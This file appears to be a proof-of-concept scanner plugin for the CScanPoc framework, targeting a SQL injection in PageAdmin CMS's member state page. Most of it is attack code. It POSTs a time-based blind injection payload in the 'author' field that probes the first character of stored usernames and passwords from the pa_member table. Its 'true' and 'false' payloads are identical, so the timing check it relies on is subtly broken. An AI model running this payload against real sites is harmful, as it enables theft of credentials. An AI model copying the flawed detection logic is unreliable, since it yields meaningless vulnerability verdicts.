# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'PageAdmin_0003_L'  # 平台漏洞编号，留空
    name = 'PageAdmin CMS SQLInjection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-01-25'  # 漏洞公布时间
    desc = '''
        PageAdmins网站管理系统采用Div+Css标准化设计，符合W3C标准。兼容主流浏览器，网站系统可免费下载、免费使用、无使用时间与任何功能限制。主要用于公司企业网站、学校类和信息类网站搭建。
        漏洞出现在:
        class ：  mem_issue。
        如果用户是 admin 或者 提交的current_username 和当前string_1 一样  string_1 是你登录的SESSION 所以需要登录。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4220/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PageAdmin'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a29ba30e-bdac-4860-9c48-4085b5f13101'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 需要注册登录获取cookies
            # 注册后直接访问登录状态界面，获取到cookies
            s = requests.session()
            s.get(self.target)
            payload = '/e/member/state.aspx?table=pa_member&detailid=2&workid=1&s=1'
            true_data = "post=update&current_title=111&current_username=aaaa2222&sendmail=1&author=' or (select top 1 asc(mid(UserName+UserPassword,1,1)) from pa_member)=97 and (SELECT count(*) FROM MSysAccessObjects AS T1, MSysAccessObjects AS T2, MSysAccessObjects AS T3, MSysAccessObjects AS T4, MSysAccessObjects AS T5, MSysAccessObjects AS T6, MSysAccessObjects AS T7,MSysAccessObjects AS T8,MSysAccessObjects AS T9,MSysAccessObjects AS T10,MSysAccessObjects AS T11,MSysAccessObjects AS T12)>0  and ''='"
            false_data = "post=update&current_title=111&current_username=aaaa2222&sendmail=1&author=' or (select top 1 asc(mid(UserName+UserPassword,1,1)) from pa_member)=97 and (SELECT count(*) FROM MSysAccessObjects AS T1, MSysAccessObjects AS T2, MSysAccessObjects AS T3, MSysAccessObjects AS T4, MSysAccessObjects AS T5, MSysAccessObjects AS T6, MSysAccessObjects AS T7,MSysAccessObjects AS T8,MSysAccessObjects AS T9,MSysAccessObjects AS T10,MSysAccessObjects AS T11,MSysAccessObjects AS T12)>0  and ''='"
            url = self.target + payload

            start_time = time.time()
            r = s.post(url, data=true_data)
            end_time_true = time.time()
            r = s.post(url, data=false_data)
            end_time_false = time.time()

            if (end_time_true-start_time) - (end_time_false-end_time_true) > 10:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
